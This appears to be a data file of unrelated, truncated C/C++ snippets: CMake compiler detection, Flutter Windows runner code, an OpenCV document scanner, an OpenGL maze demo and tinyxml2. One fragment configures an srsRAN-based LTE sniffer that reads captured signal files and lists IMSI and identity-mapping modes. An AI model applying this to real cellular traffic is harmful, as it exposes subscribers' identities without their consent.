 define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// #pragma once\n\n#include \"read_sample.h\"\n\n// g++ -std=c++11 -I/usr/local/include -L/usr/local/lib read_sample.cpp -luhd  -o read_sample\n\n// Assuming the file is a binary file containing complex<float> data\nstd::vector<std::complex<float>> read_from_file(const std::string& filename) {\n    std::ifstream file(filename, std::ios::binary);\n    std::vector<std::complex<float>> buffer;\n\n    if (file.is_open()) {\n        std::complex<float> value;\n        while (file.read(reinterpret_cast<char*>(&value), sizeof(std::complex<float>))) {\n            buffer.push_back(value);\n        }\n        file.close();\n    }\n\n    return buffer;\n}\n\nint main(){\n    std::vector<std::complex<float>> dl_buffer = read_from_file(\"/home/anonymous/signal_data/dl_samples_0.bin\");\n    std::vector<std::complex<float>> ul_buffer = read_from_file(\"/home/anonymous/signal_data/ul_samples_0.bin\");\n\n    int srsran_rf_recv_wrapper( void* h,\n                            cf_t* data_[SRSRAN_MAX_PORTS], \n                            uint32_t nsamples, \n                            srsran_timestamp_t* t);\n\n    // initial configuration\n    cell_search_cfg_t cell_detect_config = {.max_frames_pbch    = SRSRAN_DEFAULT_MAX_FRAMES_PBCH,\n                                        .max_frames_pss       = SRSRAN_DEFAULT_MAX_FRAMES_PSS,\n                                        .nof_valid_pss_frames = SRSRAN_DEFAULT_NOF_VALID_PSS_FRAMES,\n                                        .init_agc             = 0,\n                                        .force_tdd            = false};\n    srsran_cell_t      cell;\n    falcon_ue_dl_t     falcon_ue_dl;\n    srsran_dl_sf_cfg_t dl_sf;\n    srsran_pdsch_cfg_t pdsch_cfg;\n    srsran_ue_sync_t   ue_sync;\n    srsran_rf_t* rf;\n    \n    // Cell Config\n    cell.nof_prb          = 50;\n    cell.id               = 1;\n    cell.nof_ports        = 2;\n    cell.cp               = SRSRAN_CP_NORM;\n    cell.phich_length     = SRSRAN_PHICH_NORM;\n    cell.phich_resources  = SRSRAN_PHICH_R_1_6;\n\n    // Args Config\n\n    uint32_t nof_subframes = DEFAULT_NOF_SUBFRAMES_TO_CAPTURE;\n    int cpu_affinity = -1;\n    bool enable_ASCII_PRB_plot = true;\n    bool enable_ASCII_power_plot = false;\n    bool disable_cfo = false;\n    uint32_t time_offset = 0;\n    int force_N_id_2 = -1; // Pick the best\n    int file_offset_time = 0;\n    double file_offset_freq = 0;\n    uint32_t nof_prb = DEFAULT_NOF_PRB;\n    uint32_t file_nof_prb = DEFAULT_NOF_PRB;\n    uint32_t file_nof_ports = DEFAULT_NOF_PORTS;\n    uint32_t file_cell_id = 0;\n    bool file_wrap = false;\n\n    double rf_freq = 2680e6;\n    double ul_freq = 2560e6;\n    uint32_t rf_nof_rx_ant = DEFAULT_NOF_RX_ANT;\n    int decimate = 0;\n    int nof_sniffer_thread = DEFAULT_NOF_THREAD;\n    // other args\n    uint32_t dci_format_split_update_interval_ms = DEFAULT_DCI_FORMAT_SPLIT_UPDATE_INTERVAL_MS;\n    double dci_format_split_ratio = DEFAULT_DCI_FORMAT_SPLIT_RATIO;\n    bool skip_secondary_meta_formats = false;\n    bool enable_shortcut_discovery = true;\n    uint32_t rnti_histogram_threshold = DEFAULT_RNTI_HISTOGRAM_THRESHOLD;\n    std::string pcap_file = \"ul_sniffer.pcap\";\n    int harq_mode = 0;\n    uint16_t rnti = SRSRAN_SIRNTI;\n    int mcs_tracking_mode = 1;\n    // char* rf_dev = \"\";\n    int verbose = 0;\n    int enable_cfo_ref = 1;\n    std::string estimator_alg = \"interpolate\";\n    bool cell_search = false;\n    uint32_t cell_id = 0;\n    int sniffer_mode = 1;\n    uint16_t target_rnti = 0;\n    bool en_debug = false;\n    int api_mode = -1; //api functions, 0: identity mapping, 1: UECapa, 2: IMSI, 3: all functions\n\n    // rf_buffer_interface* buffer;\n    srsran::rf_buffer_interface* buf;\n    // buf->set_nof_samples();\n    HARQ harq;\n    harq.init_HARQ(harq_mode);\n    UL_HARQ  ul_harq;\n    ULSchedule  ulsche(target_rnti, &ul_harq, en_debug);\n    ulsche.set_multi_offset(sniffer_mode);\n\n    int ret, n;                 // return\n    uint8_t mch_table[10];      // unknown\n    float search_cell_cfo = 0;  // freg. offset\n    uint32_t sfn = 0;           // system frame number\n    uint32_t skip_cnt = 0;      // number of skipped subframe\n    uint32_t total_sf = 0;\n    uint32_t skip_last_1s = 0;\n    uint16_t nof_lost_sync = 0;\n    int mcs_tracking_timer = 0;\n    int update_rnti_timer = 0;\n\n    int srate = srsran_sampling_freq_hz(cell.nof_prb);\n    if (srate != -1) {\n      printf(\"Setting sampling rate %.2f MHz\\n\", (float)srate / 1000000);\n    //   float srate_rf = srsran_rf_set_rx_srate(&rf, (double)srate);\n    }\n\n    std::string input_file_name = \"/home/anonymous/signal_data/1845.bin.sigmf-data\";\n\n    char* tmp_filename = new char[input_file_name.length()+1];\n    strncpy(tmp_filename, input_file_name.c_str(), input_file_name.length());\n    tmp_filename[input_file_name.length()] = 0;\n    if (srsran_ue_sync_init_file_multi(&ue_sync,\n                                       cell.nof_prb,\n                                       tmp_filename,\n                                       file_offset_time,\n                                       file_offset_freq,\n ",
    "#include \"Scanner.hpp\"\n\nScanner::Scanner() {\n\tthis->cropped = false;\n};\n\nbool compareContourAreas(vector<Point> contour1, vector<Point> contour2){\n\tdouble i = fabs(contourArea(Mat(contour1)));\n\tdouble j = fabs(contourArea(Mat(contour2)));\n\treturn (i > j);\n}\n\nbool compareXCords(Point p1, Point p2){\n\treturn (p1.x < p2.x);\n}\n\nbool compareYCords(Point p1, Point p2){\n\treturn (p1.y < p2.y);\n}\n\nbool compareDistance(pair<Point, Point> p1, pair<Point, Point> p2){\n\treturn (norm(p1.first - p1.second) < norm(p2.first - p2.second));\n}\n\ndouble distance(Point p1, Point p2){\n\treturn sqrt(((p1.x - p2.x) * (p1.x - p2.x)) + ((p1.y - p2.y) * (p1.y - p2.y)));\n}\n\nvoid resizeToHeight(Mat src, Mat &dst, int height){\n\tSize s = Size(src.cols * (height / double(src.rows)), height);\n\tresize(src, dst, s, INTER_AREA);\n}\n\nvoid Scanner::orderPoints(vector<Point> inpts, vector<Point> &ordered){\n\tsort(inpts.begin(), inpts.end(), compareXCords);\n\tvector<Point> lm(inpts.begin(), inpts.begin()+2);\n\tvector<Point> rm(inpts.end()-2, inpts.end());\n\n\tsort(lm.begin(), lm.end(), compareYCords);\n\tPoint tl(lm[0]);\n\tPoint bl(lm[1]);\n\tvector<pair<Point, Point> > tmp;\n\n\tfor(size_t i = 0; i< rm.size(); i++){\n\t\ttmp.push_back(make_pair(tl, rm[i]));\n\t}\n\n\tsort(tmp.begin(), tmp.end(), compareDistance);\n\tPoint tr(tmp[0].second);\n\tPoint br(tmp[1].second);\n\n\tordered.push_back(tl);\n\tordered.push_back(tr);\n\tordered.push_back(br);\n\tordered.push_back(bl);\n}\n\nvoid Scanner::fourPointTransform(Mat src, Mat &dst, vector<Point> pts){\n\tvector<Point> orderedPts;\n\torderPoints(pts, orderedPts);\n\n\tdouble wa = distance(orderedPts[2], orderedPts[3]);\n\tdouble wb = distance(orderedPts[1], orderedPts[0]);\n\tdouble mw = max(wa, wb);\n\n\tdouble ha = distance(orderedPts[1], orderedPts[2]);\n\tdouble hb = distance(orderedPts[0], orderedPts[3]);\n\tdouble mh = max(ha, hb);\n\n\tPoint2f src_[] ={\n        Point2f(orderedPts[0].x, orderedPts[0].y),\n        Point2f(orderedPts[1].x, orderedPts[1].y),\n        Point2f(orderedPts[2].x, orderedPts[2].y),\n        Point2f(orderedPts[3].x, orderedPts[3].y),\n\t};\n\n\tPoint2f dst_[] ={\n        Point2f(0,0),\n        Point2f(mw-1, 0),\n        Point2f(mw-1, mh-1),\n        Point2f(0, mh-1)\n\t};\n\n\tMat m = getPerspectiveTransform(src_, dst_);\n\twarpPerspective(src, dst, m, Size(mw, mh), BORDER_REPLICATE, INTER_LINEAR);\n}\n\nvoid Scanner::processEdge(Mat input, Mat &output, int openKSize, int closeKSize, bool gaussianBlur){\n    Mat image_pp, structuringElmt;\n\tcvtColor(input, image_pp, COLOR_BGR2GRAY);\n\n\tif (openKSize > 0){\n\t\tstructuringElmt = getStructuringElement(MORPH_ELLIPSE, Size(openKSize,openKSize));\n\t\tmorphologyEx(image_pp, image_pp, MORPH_OPEN, structuringElmt);\n\t}\n\tif (closeKSize > 0){\n\t\tstructuringElmt = getStructuringElement(MORPH_ELLIPSE, Size(closeKSize,closeKSize));\n\t\tmorphologyEx(image_pp, image_pp, MORPH_CLOSE, structuringElmt);\n\t}\n\n\tif (gaussianBlur){\n\t\tGaussianBlur(image_pp, image_pp, Size(7,7), 0);\n\t}\n\tCanny(image_pp, output, 50, 60, 3, true);\n}\n\nvoid Scanner::process(Mat image, Mat &output){\n\tMat orig = image.clone();\n\n\tdouble ratio = image.rows / 500.0;\n\tresizeToHeight(image, image, 500);\n\n\tMat edged, edgedCache;\n\tprocessEdge(image, edged, 11, 11, true);\n\tedgedCache = edged.clone();\n\n\tvector<vector<Point>> contours, shapes;\n\tvector<Vec4i> hierarchy;\n\t\n\tfindContours(edged, contours, hierarchy, RETR_LIST, CHAIN_APPROX_SIMPLE);\n\tedged = Mat::zeros(Size(image.cols, image.rows), CV_8UC1);\n\n\tvector<vector<Point>> hull(contours.size());\n\tint sum_area = 0, mean_area = 0;\n\n\tfor(int i=0; i<contours.size(); i++){\n\t\tconvexHull(Mat(contours[i]), hull[i], false);\n\t\tsum_area += contourArea(Mat(hull[i]));\n\t}\n\tmean_area = sum_area / hull.size();\n\n\tfor(int i=0; i<hull.size(); i++){\n\t\tif(contourArea(Mat(hull[i])) >= mean_area){\n\t\t\tshapes.push_back(hull[i]);\n\t\t}\n\t}\n\tsort(shapes.begin(), shapes.end(), compareContourAreas);\t\n\n\tfor(int i=1; i<shapes.size(); i++){\n\t\tfor(int j=0; j<shapes[i].size(); j++)\n\t\t\tshapes[0].push_back(shapes[i][j]);\n\t}\n\n\tconvexHull(Mat(shapes[0]), hull[0], false);\n\tdrawContours(edged, hull, 0, 255, 2);\n\tfindContours(edged, contours, hierarchy, RETR_LIST, CHAIN_APPROX_SIMPLE);\n\n\tvector<vector<Point>> approx;\n\tapprox.resize(contours.size());\n\n\tfor(int i=0; i<contours.size(); i++){\n\t\tdouble peri = 0.01 * arcLength(contours[i], true);\n\t\tapproxPolyDP(contours[i], approx[i], peri, true);\n\t}\n\n\tfor(int i=0; i<approx.size(); i++){\n\t\tif(approx[i].size() == 4){\n\t\t\tfor(int j=0; j<approx[i].size(); j++)\n\t\t\t\tapprox[i][j] *= ratio;\n\n\t\t\tfourPointTransform(orig, output, approx[i]);\n\t\t\tthis->cropped = true;\n\t\t\treturn;\n\t\t}\n\t}\n\n\tprocessEdge(image, edgedCache, 11, 9, false);\n\n\tMat kernel = getStructuringElement(MORPH_RECT, Size(21,21));\n\tdilate(edgedCache, edgedCache, kernel);\n\n    normalize(edgedCache, edgedCache, 0, 255, NORM_MINMAX, CV_32F);\n\n\tint minX = edgedCache.cols, minY = edgedCache.rows;\n\tint maxX = 0, maxY = 1;\n\n\tfor (int i=0; i<edgedCache.rows; i++){\n\t\tfor (int j=0; j<edgedCache.cols; j++){\n\t\t\tif (edgedCache.at<float>(i,j) > 0){\n\t\t\t\tminX = j < minX ? j : minX;\n\t",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"authentication_firebase\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <GL/freeglut.h>\n#include <cmath>\n#include <vector>\n#include <iostream>\n\n// Global variables for camera position and angle\nfloat cameraAngleX = 0.0f;\nfloat cameraAngleY = 0.0f;\nfloat cameraPosX = 0.0f;\nfloat cameraPosY = 0.0f; // This will remain constant for level movement\nfloat cameraPosZ = 5.0f;\n\n// Initialize mouse position\nint mouseX = 0, mouseY = 0;\n\nstruct Wall {\n    float minX, maxX, minZ, maxZ; // Bounding box of the wall\n};\n\nstd::vector<Wall> walls;\n\n// Initialize your maze structure, including walls\nvoid initMaze() {\n    // Example: Add a cube wall centered at (0, 0) with a side length of 1\n    Wall wall = { -0.5f, 0.5f, -0.5f, 0.5f }; // This assumes Y is up, and we're looking down on XZ plane\n    walls.push_back(wall);\n    // Add other walls as needed\n}\n\nbool checkCollisionWithWalls(float nextX, float nextZ) {\n    for (const Wall& wall : walls) {\n        if (nextX >= wall.minX && nextX <= wall.maxX &&\n            nextZ >= wall.minZ && nextZ <= wall.maxZ) {\n            return true; // Collision detected\n        }\n    }\n    return false; // No collision\n}\n\nvoid display() {\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n    glLoadIdentity();\n\n    // Calculate camera direction based on mouse movement\n    float lx = sin(cameraAngleX);\n    float lz = -cos(cameraAngleX);\n    float ly = sin(cameraAngleY);\n\n    // The camera's Y position is constant; it doesn't change with mouse movement\n    gluLookAt(cameraPosX, cameraPosY, cameraPosZ,\n        cameraPosX + lx, cameraPosY + ly, cameraPosZ + lz,\n        0.0f, 1.0f, 0.0f);\n\n    for (const Wall& wall : walls) {\n        glPushMatrix();\n        float centerX = (wall.minX + wall.maxX) / 2.0f;\n        float centerZ = (wall.minZ + wall.maxZ) / 2.0f;\n        float sizeX = wall.maxX - wall.minX;\n        float sizeZ = wall.maxZ - wall.minZ;\n\n        glTranslatef(centerX, 0.0f, centerZ); // Translate to the center of the cube\n        glScalef(sizeX, 1.0f, sizeZ); // Scale cube to correct size (assuming uniform height for simplicity)\n        glutWireCube(1.0f); // Draw cube with unit size, scaling will adjust\n        glPopMatrix();\n    }\n\n\n    glutSwapBuffers();\n}\n\nvoid reshape(int w, int h) {\n    if (h == 0) h = 1;\n    float ratio = 1.0 * w / h;\n\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n\n    glViewport(0, 0, w, h);\n    gluPerspective(45.0, ratio, 0.1, 100.0);\n\n    glMatrixMode(GL_MODELVIEW);\n}\n\nvoid processNormalKeys(unsigned char key, int x, int y) {\n    float fraction = 0.1f;\n\n    float deltaX = 0, deltaZ = 0;\n\n    // Calculate camera direction components based on the current camera angle\n    float lx = sin(cameraAngleX);\n    float lz = -cos(cameraAngleX);\n\n    switch (key) {\n    case 'w':\n        deltaZ = fraction * lz;\n        deltaX = fraction * lx;\n        break;\n    case 's':\n        deltaZ = -fraction * lz;\n        deltaX = -fraction * lx;\n        break;\n    case 'a':\n        // Move left\n        deltaX = -fraction * cos(cameraAngleX);\n        deltaZ = -fraction * sin(cameraAngleX);\n        break;\n    case 'd':\n        // Move right\n        deltaX = fraction * cos(cameraAngleX);\n        deltaZ = fraction * sin(cameraAngleX);\n        break;\n    }\n\n    float nextX = cameraPosX + deltaX;\n    float nextZ = cameraPosZ + deltaZ;\n\n    if (!checkCollisionWithWalls(nextX, nextZ)) {\n        // If no collision, proceed with movement\n        cameraPosX = nextX;\n        cameraPosZ = nextZ;\n    }\n    else {\n        std::cout << \"Collision\" << \"\\n\";\n    }\n}\n\nvoid mouseMove(int x, int y) {\n    // Initialize mouse position to the center of the window\n    int windowWidth = glutGet(GLUT_WINDOW_WIDTH);\n    int windowHeight = glutGet(GLUT_WINDOW_HEIGHT);\n\n    // Calculate the mouse movement from the center of the window\n    int deltaX = x - windowWidth / 2;\n    int deltaY = y - windowHeight / 2;\n\n    // Only update camera angles if there was any movement\n    if (deltaX != 0 || deltaY != 0) {\n        cameraAngleX += deltaX * 0.001f;\n        cameraAngleY -= deltaY * 0.001f;\n\n        // Limit the vertical look angle to prevent flipping\n        if (cameraAngleY < -1.5f)\n            cameraAngleY = -1.5f;\n        else if (cameraAngleY > 1.5f)\n            cameraAngleY = 1.5f;\n    }\n\n    // Always re-center the mouse pointer to prevent it from leaving the window\n    glutWarpPointer(windowWidth / 2, windowHeight / 2);\n}\n\n\nint main(int argc, char** argv) {\n    // Initialize GLUT and create a window\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_DEPTH | GLUT_DOUBLE | GLUT_RGBA);\n    glutInitWindowPosition(100, 100);\n    glutInitWindowSize(1600, 1200);\n    glutCreateWindow(\"3D Navigation Example\");\n    glutSetCursor(GLUT_CURSOR_NONE);\n\n    initMaze();\n\n    // Register callbacks\n    glutDisplayFunc(display);\n    glutReshapeFunc(reshape);\n    glutIdleFunc(display);\n    glutKeyboardFunc(processNormalKeys);\n    glutPassiveMotionFunc(mouseMove); // Mouse movement without buttons pressed\n\n    // OpenGL initialization\n    glEnable(GL_DEPTH_TEST);\n\n    // Se",
    "/*\nOriginal code by Lee Thomason (www.grinninglizard.com)\n\nThis software is provided 'as-is', without any express or implied\nwarranty. In no event will the authors be held liable for any\ndamages arising from the use of this software.\n\nPermission is granted to anyone to use this software for any\npurpose, including commercial applications, and to alter it and\nredistribute it freely, subject to the following restrictions:\n\n1. The origin of this software must not be misrepresented; you must\nnot claim that you wrote the original software. If you use this\nsoftware in a product, an acknowledgment in the product documentation\nwould be appreciated but is not required.\n\n2. Altered source versions must be plainly marked as such, and\nmust not be misrepresented as being the original software.\n\n3. This notice may not be removed or altered from any source\ndistribution.\n*/\n\n#include \"tinyxml2.h\"\n\n#include <new>\t\t// yes, this one new style header, is in the Android SDK.\n#   ifdef ANDROID_NDK\n#   include <stddef.h>\n#else\n#   include <cstddef>\n#endif\n\nstatic const char LINE_FEED\t\t\t\t= (char)0x0a;\t\t\t// all line endings are normalized to LF\nstatic const char LF = LINE_FEED;\nstatic const char CARRIAGE_RETURN\t\t= (char)0x0d;\t\t\t// CR gets filtered out\nstatic const char CR = CARRIAGE_RETURN;\nstatic const char SINGLE_QUOTE\t\t\t= '\\'';\nstatic const char DOUBLE_QUOTE\t\t\t= '\\\"';\n\n// Bunch of unicode info at:\n//\t\thttp://www.unicode.org/faq/utf_bom.html\n//\tef bb bf (Microsoft \"lead bytes\") - designates UTF-8\n\nstatic const unsigned char TIXML_UTF_LEAD_0 = 0xefU;\nstatic const unsigned char TIXML_UTF_LEAD_1 = 0xbbU;\nstatic const unsigned char TIXML_UTF_LEAD_2 = 0xbfU;\n\n\n#define DELETE_NODE( node )\t{\t\t\t\\\n        if ( node ) {\t\t\t\t\t\t\\\n            MemPool* pool = node->_memPool;\t\\\n            node->~XMLNode();\t\t\t\t\\\n            pool->Free( node );\t\t\t\t\\\n        }\t\t\t\t\t\t\t\t\t\\\n    }\n#define DELETE_ATTRIBUTE( attrib ) {\t\t\\\n        if ( attrib ) {\t\t\t\t\t\t\t\\\n            MemPool* pool = attrib->_memPool;\t\\\n            attrib->~XMLAttribute();\t\t\t\\\n            pool->Free( attrib );\t\t\t\t\\\n        }\t\t\t\t\t\t\t\t\t\t\\\n    }\n\nnamespace tinyxml2\n{\n\nstruct Entity {\n    const char* pattern;\n    int length;\n    char value;\n};\n\nstatic const int NUM_ENTITIES = 5;\nstatic const Entity entities[NUM_ENTITIES] = {\n    { \"quot\", 4,\tDOUBLE_QUOTE },\n    { \"amp\", 3,\t\t'&'  },\n    { \"apos\", 4,\tSINGLE_QUOTE },\n    { \"lt\",\t2, \t\t'<'\t },\n    { \"gt\",\t2,\t\t'>'\t }\n};\n\n\nStrPair::~StrPair()\n{\n    Reset();\n}\n\n\nvoid StrPair::Reset()\n{\n    